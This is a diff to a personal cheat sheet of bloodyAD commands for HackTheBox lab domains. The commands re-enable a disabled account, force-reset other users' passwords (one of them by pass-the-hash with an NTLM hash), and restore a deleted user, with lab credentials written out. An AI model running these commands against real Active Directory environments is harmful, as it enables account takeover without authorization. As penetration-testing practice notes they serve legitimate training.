@@ -1,4 +1,6 @@
-enable user:
+[wiki](https://github.com/CravateRouge/bloodyAD/wiki/User-Guide)
+
+### enable user:
 ```bash
 bloodyAD --host DC.puppy.htb -d puppy.htb -u ant.edwards -p 'Antman2025!' remove uac 'ADAM.SILVER' -f ACCOUNTDISABLE
 
@@ -10,7 +12,7 @@ adam.silver -> account to be enabled
 
 ---
 
-force change password:
+### force change password:
 ```bash
 bloodyAD -u ant.edwards -p 'Antman2025!' -d puppy.htb --dc-ip 10.10.11.70 set password adam.silver 'P@ssw4rd123'
 ```
@@ -19,6 +21,11 @@ using hash:
 ```bash
 bloodyAD -u "ansible_dev$" -p :4b21348ca4a9edff9689cdf75cbda439 -d tombwatcher.htb --dc-ip 10.10.11.72 set password sam face
 ```
-just -p: before the password
+> ***just -p: before the password***
 
 ---
+### restore user
+```bash
+bloodyAD --host <DC_IP_or_hostname> -d <DOMAIN> -u <USER> -p <PASSWORD_or_HASH> -k set restore <DeletedUserSAM>
+
+```
